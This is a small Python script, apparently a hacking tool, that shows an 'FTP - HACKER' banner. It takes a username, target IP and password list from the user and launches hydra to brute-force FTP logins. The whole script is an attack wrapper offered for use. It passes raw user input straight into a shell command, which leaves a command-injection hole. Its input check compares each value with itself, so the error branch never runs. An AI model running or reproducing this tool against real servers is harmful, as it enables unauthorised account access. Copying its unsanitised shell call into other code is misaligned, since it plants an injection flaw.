import os
from colorama import Fore
import time

def banner():
        os.system('clear')
        print(Fore.RED + '''

    :::::::::: ::::::::::: :::::::::  
    :+:            :+:     :+:    :+: 
    +:+            +:+     +:+    +:+ 
    :#::+::#       +#+     +#++:++#+  
    +#+            +#+     +#+        
    #+#            #+#     #+#        
    ###            ###     ###        - HACKER''')
        print("")
        print("")
        print("")
    
def main():
    while True:
        banner()
        username = input("Enter User: ")
        ip = input("Enter IP: ")
        passlist = input("Enter Password List: ")

        if username == username and ip == ip:
            os.system(f'hydra -l {username} -P {passlist} ftp://{ip}')
            print("")
            input("[+] Press Enter To Continue...")
        else:
            print(Fore.YELLOW + "[-] ERROR CAME ACROSS MAKE SURE HYDRA IS INSTALLED!")
            time.sleep(1)

if __name__ == "__main__":
    main()